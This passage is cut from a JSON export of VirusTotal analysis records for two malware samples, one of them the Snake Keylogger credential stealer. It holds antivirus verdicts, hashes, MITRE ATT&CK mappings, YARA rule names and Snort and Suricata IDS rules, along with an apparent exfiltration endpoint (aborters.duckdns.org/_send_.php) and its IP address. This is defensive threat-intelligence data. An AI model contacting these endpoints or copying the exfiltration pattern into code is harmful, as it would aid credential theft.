          "engine_update": "20240116",
          "category": "timeout",
          "result": null
        },
        "Trustlook": {
          "method": "blacklist",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "engine_update": "20240116",
          "category": "type-unsupported",
          "result": null
        },
        "SymantecMobileInsight": {
          "method": "blacklist",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "engine_update": "20240103",
          "category": "type-unsupported",
          "result": null
        },
        "BitDefenderFalx": {
          "method": "blacklist",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "engine_update": "20240108",
          "category": "type-unsupported",
          "result": null
        },
        "Avast-Mobile": {
          "method": "blacklist",
          "engine_name": "Avast-Mobile",
          "engine_version": "240116-02",
          "engine_update": "20240116",
          "category": "type-unsupported",
          "result": null
        }
      },
      "vhash": "025066551d1d75151019z5017z11z13z21z31z1az1",
      "trid": [
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 32.3
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 28.9
        },
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 13
        },
        {
          "file_type": "Generic Win/DOS Executable",
          "probability": 12.8
        },
        {
          "file_type": "DOS Executable Generic",
          "probability": 12.8
        }
      ],
      "magic": "PE32 executable (GUI) Intel 80386, for MS Windows",
      "last_modification_date": 1705408187,
      "sha1": "9f01d4442c495c7128649b98201187bc0c58dedd",
      "tags": [
        "peexe",
        "runtime-modules",
        "detect-debug-environment",
        "idle",
        "long-sleeps",
        "direct-cpu-clock-access",
        "checks-user-input",
        "spreader"
      ],
      "last_analysis_date": 1705400924,
      "sha256": "178ba564b39bd07577e974a9b677dfd86ffa1f1d0299dfd958eb883c5ef6c3e1"
    }
  },
  "mitre": {
    "data": {
      "CAPA": {
        "tactics": [
          {
            "id": "TA0005",
            "name": "Defense Evasion",
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "id": "T1027",
                "name": "Obfuscated Files or Information",
                "link": "https://attack.mitre.org/techniques/T1027/",
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "encode data using XOR"
                  },
                  {
                    "severity": "INFO",
                    "description": "encrypt data using RC4 KSA"
                  },
                  {
                    "severity": "INFO",
                    "description": "encrypt data using RC4 PRGA"
                  }
                ]
              },
              {
                "id": "T1112",
                "name": "Modify Registry",
                "link": "https://attack.mitre.org/techniques/T1112/",
                "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "delete registry key"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0002",
            "name": "Execution",
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "id": "T1129",
                "name": "Shared Modules",
                "link": "https://attack.mitre.org/techniques/T1129/",
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "parse PE header"
                  },
                  {
                    "severity": "INFO",
                    "description": "forwarded export"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0007",
            "name": "Discovery",
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "id": "T1010",
                "name": "Application Window Discovery",
                "link": "https://attack.mitre.org/techniques/T1010/",
                "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "find graphical window"
                  }
                ]
              },
              {
                "id": "T1012",
                "name": "Query Registry",
                "link": "https://attack.mitre.org/techniques/T1012/",
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "query or enumerate registry value"
                  }
                ]
              }
            ]
          }
        ]
      },
      "Zenbox": {
        "tactics": [
          {
            "id": "TA0005",
            "name": "Defense Evasion",
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/",
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  },
                  {
                    "severity": "INFO",
                    "description": "Sleep loop found (likely to delay execution)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Tries to delay execution (extensive OutputDebugStringW loop)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Sample may be VM or Sandbox-aware, try analysis on a native machine"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0007",
            "name": "Discovery",
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/",
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  },
                  {
                    "severity": "INFO",
                    "description": "Sleep loop found (likely to delay execution)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Tries to delay execution (extensive OutputDebugStringW loop)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Sample may be VM or Sandbox-aware, try analysis on a native machine"
                  }
                ]
              },
              {
                "id": "T1518.001",
                "name": "Security Software Discovery",
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Tries to detect virtualization through RDTSC time measurements"
                  }
                ]
              },
              {
                "id": "T1010",
                "name": "Application Window Discovery",
                "link": "https://attack.mitre.org/techniques/T1010/",
                "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Sample monitors Window changes (e.g. starting applications), analyze the sample with the simulation cookbook"
                  }
                ]
              },
              {
                "id": "T1082",
                "name": "System Information Discovery",
                "link": "https://attack.mitre.org/techniques/T1082/",
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Tries to detect virtualization through RDTSC time measurements"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the cryptographic machine GUID"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0006",
            "name": "Credential Access",
            "link": "https://attack.mitre.org/tactics/TA0006/",
            "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "techniques": [
              {
                "id": "T1056",
                "name": "Input Capture",
                "link": "https://attack.mitre.org/techniques/T1056/",
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates a DirectInput object (often for capturing keystrokes)"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0009",
            "name": "Collection",
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "id": "T1056",
                "name": "Input Capture",
                "link": "https://attack.mitre.org/techniques/T1056/",
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates a DirectInput object (often for capturing keystrokes)"
                  }
                ]
              }
            ]
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/178ba564b39bd07577e974a9b677dfd86ffa1f1d0299dfd958eb883c5ef6c3e1/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65bac68b0e994d74c761c864"
  },
  "data": {
    "id": "c7362845283503e1538fd1c4ba224becc55c213613c30684fa790cd6f99d2094",
    "type": "file",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/c7362845283503e1538fd1c4ba224becc55c213613c30684fa790cd6f99d2094"
    },
    "attributes": {
      "trid": [
        {
          "file_type": "Generic CIL Executable (.NET, Mono, etc.)",
          "probability": 71.1
        },
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 10.2
        },
        {
          "file_type": "Win32 Dynamic Link Library (generic)",
          "probability": 6.3
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 4.3
        },
        {
          "file_type": "Windows Icons Library (generic)",
          "probability": 2
        }
      ],
      "ssdeep": "12288:UTI9SCF1OxyQQB8naJ3f2e0wfJ5nqtk2KJfY4L8L5/:gI9ZkyQQEaZf2TyJ5nqo58L5/",
      "sigma_analysis_stats": {
        "high": 0,
        "medium": 2,
        "critical": 0,
        "low": 0
      },
      "popular_threat_classification": {
        "popular_threat_name": [
          {
            "value": "msil",
            "count": 11
          },
          {
            "value": "snakelogger",
            "count": 6
          },
          {
            "value": "msilheracles",
            "count": 4
          }
        ],
        "suggested_threat_label": "trojan.msil/snakelogger",
        "popular_threat_category": [
          {
            "value": "trojan",
            "count": 18
          },
          {
            "value": "spyware",
            "count": 2
          }
        ]
      },
      "authentihash": "5d5afdefc192614d3657aee1769d59f3c821a788481042cdf8dcbb52e4f6258d",
      "last_modification_date": 1706737704,
      "type_tag": "peexe",
      "crowdsourced_yara_results": [
        {
          "description": "Detects executables with potential process hoocking",
          "author": "ditekSHen",
          "ruleset_name": "indicator_suspicious",
          "rule_name": "INDICATOR_SUSPICIOUS_EXE_DotNetProcHook",
          "ruleset_id": "00c3b8eb5d",
          "match_in_subfile": true,
          "source": "https://github.com/ditekshen/detection"
        },
        {
          "description": "Detects Encrial credential stealer malware",
          "author": "Florian Roth (Nextron Systems)",
          "ruleset_name": "crime_envrial",
          "rule_name": "MAL_Envrial_Jan18_1",
          "ruleset_id": "00036309c8",
          "match_in_subfile": true,
          "source": "https://github.com/Neo23x0/signature-base"
        },
        {
          "ruleset_id": "01594f70b5",
          "rule_name": "Windows_Trojan_SnakeKeylogger_af3faa65",
          "ruleset_name": "Windows_Trojan_SnakeKeylogger",
          "match_in_subfile": true,
          "author": "Elastic Security",
          "source": "https://github.com/elastic/protections-artifacts"
        },
        {
          "description": "Detects Snake Keylogger",
          "author": "ditekSHen",
          "ruleset_name": "malware",
          "rule_name": "MALWARE_Win_SnakeKeylogger",
          "ruleset_id": "00cc803bdc",
          "match_in_subfile": true,
          "source": "https://github.com/ditekshen/detection"
        },
        {
          "description": "Detects executables referencing many email and collaboration clients. Observed in information stealers",
          "author": "ditekSHen",
          "ruleset_name": "indicator_suspicious",
          "rule_name": "INDICATOR_SUSPICIOUS_EXE_References_Messaging_Clients",
          "ruleset_id": "00c3b8eb5d",
          "match_in_subfile": true,
          "source": "https://github.com/ditekshen/detection"
        },
        {
          "description": "Detects binaries (Windows and macOS) referencing many web browsers. Observed in information stealers.",
          "author": "ditekSHen",
          "ruleset_name": "indicator_suspicious",
          "rule_name": "INDICATOR_SUSPICIOUS_Binary_References_Browsers",
          "ruleset_id": "00c3b8eb5d",
          "match_in_subfile": true,
          "source": "https://github.com/ditekshen/detection"
        }
      ],
      "crowdsourced_ids_stats": {
        "high": 0,
        "info": 0,
        "medium": 3,
        "low": 8
      },
      "magic": "PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows",
      "unique_sources": 4,
      "detectiteasy": {
        "filetype": "PE32",
        "values": [
          {
            "version": "v4.0.30319",
            "type": "Library",
            "name": ".NET"
          },
          {
            "type": "Linker",
            "name": "Microsoft Linker"
          }
        ]
      },
      "crowdsourced_ids_results": [
        {
          "rule_category": "Device Retrieving External IP Address Detected",
          "alert_severity": "medium",
          "rule_msg": "ET POLICY External IP Lookup - checkip.dyndns.org",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET POLICY External IP Lookup - checkip.dyndns.org\"; flow:established,to_server; http.host; content:\"checkip.dyndns.org\"; fast_pattern; depth:18; endswith; classtype:external-ip-check; sid:2021378; rev:5; metadata:created_at 2015_07_02, former_category POLICY, updated_at 2020_09_14;)",
          "alert_context": [
            {
              "url": "http://checkip.dyndns.org/",
              "hostname": "checkip.dyndns.org",
              "dest_ip": "193.122.6.168",
              "dest_port": 80
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2021378"
        },
        {
          "rule_category": "Device Retrieving External IP Address Detected",
          "alert_severity": "medium",
          "rule_msg": "ET INFO 404/Snake/Matiex Keylogger Style External IP Check",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET INFO 404/Snake/Matiex Keylogger Style External IP Check\"; flow:established,to_server; http.start; content:\"GET / HTTP/1.1|0d 0a|User-Agent|3a 20|Mozilla/4.0 (compatible|3b 20|MSIE 6.0|3b 20|Windows NT 5.2|3b 20|.NET CLR1.0.3705|3b|)|0d 0a|Host|3a 20|checkip.dyndns.org|0d 0a|Connection|3a 20|Keep-Alive|0d 0a 0d 0a|\"; bsize:151; fast_pattern; reference:md5,017e7b6b886cce51eb03ce097c1a4c80; classtype:external-ip-check; sid:2039190; rev:3; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2020_05_13, deployment Perimeter, former_category INFO, malware_family 404Keylogger, signature_severity Informational, updated_at 2020_05_13; target:src_ip;)",
          "rule_url": "https://rules.emergingthreats.net/",
          "alert_context": [
            {
              "url": "http://checkip.dyndns.org/",
              "hostname": "checkip.dyndns.org",
              "dest_ip": "193.122.6.168",
              "dest_port": 80
            }
          ],
          "rule_references": [
            "https://www.virustotal.com/gui/search/017e7b6b886cce51eb03ce097c1a4c80"
          ],
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2039190"
        },
        {
          "rule_category": "Device Retrieving External IP Address Detected",
          "alert_severity": "medium",
          "rule_msg": "ET INFO External IP Lookup Domain in DNS Query (checkip .dyndns .org)",
          "rule_raw": "alert dns $HOME_NET any -> any any (msg:\"ET INFO External IP Lookup Domain in DNS Query (checkip .dyndns .org)\"; dns.query; content:\"checkip.dyndns.org\"; nocase; bsize:18; classtype:external-ip-check; sid:2043238; rev:1; metadata:attack_target Client_Endpoint, created_at 2023_01_09, deployment Perimeter, performance_impact Low, signature_severity Informational, updated_at 2023_01_09;)",
          "alert_context": [
            {
              "dest_ip": "8.8.8.8",
              "dest_port": 53
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2043238"
        },
        {
          "rule_category": "Misc activity",
          "alert_severity": "low",
          "rule_msg": "ET INFO DYNAMIC_DNS Query to *.duckdns. Domain",
          "rule_raw": "alert dns $HOME_NET any -> any any (msg:\"ET INFO DYNAMIC_DNS Query to *.duckdns. Domain\"; dns.query; content:\".duckdns.\"; nocase; classtype:misc-activity; sid:2022918; rev:4; metadata:created_at 2016_06_27, former_category INFO, signature_severity Informational, updated_at 2020_08_18;)",
          "alert_context": [
            {
              "dest_ip": "8.8.8.8",
              "dest_port": 53
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2022918"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET INFO DYNAMIC_DNS Query to a *.duckdns .org Domain",
          "rule_raw": "alert dns $HOME_NET any -> any any (msg:\"ET INFO DYNAMIC_DNS Query to a *.duckdns .org Domain\"; dns.query; content:\".duckdns.org\"; fast_pattern; nocase; endswith; reference:url,changeip.com; classtype:bad-unknown; sid:2042936; rev:2; metadata:attack_target Client_and_Server, created_at 2022_12_15, deployment Perimeter, former_category INFO, performance_impact Low, signature_severity Informational, updated_at 2022_12_15, mitre_tactic_id TA0011, mitre_tactic_name Command_And_Control, mitre_technique_id T1568, mitre_technique_name Dynamic_Resolution;)",
          "rule_url": "https://rules.emergingthreats.net/",
          "alert_context": [
            {
              "dest_ip": "8.8.8.8",
              "dest_port": 53
            }
          ],
          "rule_references": [
            "https://changeip.com"
          ],
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2042936"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET INFO DYNAMIC_DNS HTTP Request to a *.duckdns .org Domain",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET INFO DYNAMIC_DNS HTTP Request to a *.duckdns .org Domain\"; flow:established,to_server; http.host; content:\".duckdns.org\"; endswith; reference:url,raw.githubusercontent.com/MISP/misp-warninglists/main/lists/dynamic-dns/list.json; classtype:bad-unknown; sid:2042937; rev:2; metadata:attack_target Client_and_Server, created_at 2022_12_15, deployment Perimeter, former_category INFO, performance_impact Low, signature_severity Informational, updated_at 2022_12_15, mitre_tactic_id TA0011, mitre_tactic_name Command_And_Control, mitre_technique_id T1568, mitre_technique_name Dynamic_Resolution;)",
          "rule_url": "https://rules.emergingthreats.net/",
          "alert_context": [
            {
              "url": "http://aborters.duckdns.org/_send_.php?TS",
              "hostname": "aborters.duckdns.org",
              "dest_ip": "91.92.255.235",
              "dest_port": 8081
            }
          ],
          "rule_references": [
            "https://raw.githubusercontent.com/MISP/misp-warninglists/main/lists/dynamic-dns/list.json"
          ],
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2042937"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET INFO DYNAMIC_DNS Query to a *.kozow .com Domain",
          "rule_raw": "alert dns $HOME_NET any -> any any (msg:\"ET INFO DYNAMIC_DNS Query to a *.kozow .com Domain\"; dns.query; content:\".kozow.com\"; fast_pattern; nocase; endswith; reference:url,www.dynu.com/ControlPanel/AddDDNS; classtype:bad-unknown; sid:2045993; rev:1; metadata:attack_target Client_and_Server, created_at 2023_06_01, deployment Perimeter, signature_severity Informational, updated_at 2023_06_01, mitre_tactic_id TA0011, mitre_tactic_name Command_And_Control, mitre_technique_id T1568, mitre_technique_name Dynamic_Resolution;)",
          "rule_url": "https://rules.emergingthreats.net/",
          "alert_context": [
            {
              "dest_ip": "8.8.8.8",
              "dest_port": 53
            }
          ],
          "rule_references": [
            "https://www.dynu.com/ControlPanel/AddDDNS"
          ],
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2045993"
        },
        {
          "rule_category": "Generic Protocol Command Decode",
          "alert_severity": "low",
          "rule_msg": "SURICATA STREAM FIN2 FIN with wrong seq",
          "rule_raw": "alert tcp any any -> any any (msg:\"SURICATA STREAM FIN2 FIN with wrong seq\"; stream-event:fin2_fin_wrong_seq; classtype:protocol-command-decode; sid:2210035; rev:2;)",
          "alert_context": [
            {
              "src_ip": "91.92.255.235",
              "src_port": 8081
            }
          ],
          "rule_url": "https://www.openinfosecfoundation.org/",
          "rule_source": "Suricata",
          "rule_id": "1:2210035"
        },
        {
          "rule_category": "Generic Protocol Command Decode",
          "alert_severity": "low",
          "rule_msg": "SURICATA STREAM FIN2 invalid ack",
          "rule_raw": "alert tcp any any -> any any (msg:\"SURICATA STREAM FIN2 invalid ack\"; stream-event:fin2_invalid_ack; classtype:protocol-command-decode; sid:2210036; rev:2;)",
          "alert_context": [
            {
              "dest_ip": "91.92.255.235",
              "dest_port": 8081
            }
          ],
          "rule_url": "https://www.openinfosecfoundation.org/",
          "rule_source": "Suricata",
          "rule_id": "1:2210036"
        },
        {
          "rule_category": "Generic Protocol Command Decode",
          "alert_severity": "low",
          "rule_msg": "SURICATA STREAM Packet with invalid ack",
          "rule_raw": "alert tcp any any -> any any (msg:\"SURICATA STREAM Packet with invalid ack\"; stream-event:pkt_invalid_ack; classtype:protocol-command-decode; sid:2210045; rev:2;)",
          "alert_context": [
            {
              "dest_ip": "91.92.255.235",
              "dest_port": 8081
            }
          ],
          "rule_url": "https://www.openinfosecfoundation.org/",
          "rule_source": "Suricata",
          "rule_id": "1:2210045"
        },
        {
          "rule_category": "misc-activity",
          "alert_severity": "low",
          "rule_msg": "INDICATOR-COMPROMISE IP address check to dyndns.org detected",
          "rule_raw": "alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS ( msg:\"INDICATOR-COMPROMISE IP address check to dyndns.org detected\"; flow:to_server,established; http_header; content:\"Host|3A 20|checkip.dyndns.org\",fast_pattern,nocase; metadata:policy max-detect-ips drop,ruleset community; service:http; classtype:misc-activity; sid:26353; rev:3; )",
          "alert_context": [
            {
              "dest_ip": "193.122.6.168",
              "dest_port": 80
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:26353"
        }
      ],
      "sha256": "c7362845283503e1538fd1c4ba224becc55c213613c30684fa790cd6f99d2094",
      "reputation": -2,
      "type_extension": "exe",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "md5": "8e94412b2dffeae1c742add73009cf29",
      "vhash": "26503675751500815e5118f3a",
      "last_analysis_results": {
        "Bkav": {
          "method": "blacklist",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "W32.AIDetectMalware.CS"
        },
        "Lionic": {
          "method": "blacklist",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Win32.SnakeLogger.l!c"
        },
        "tehtris": {
          "method": "blacklist",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "DrWeb": {
          "method": "blacklist",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.DownLoaderNET.710"
        },
        "MicroWorld-eScan": {
          "method": "blacklist",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Gen:Variant.MSILHeracles.143648"
        },
        "ClamAV": {
          "method": "blacklist",
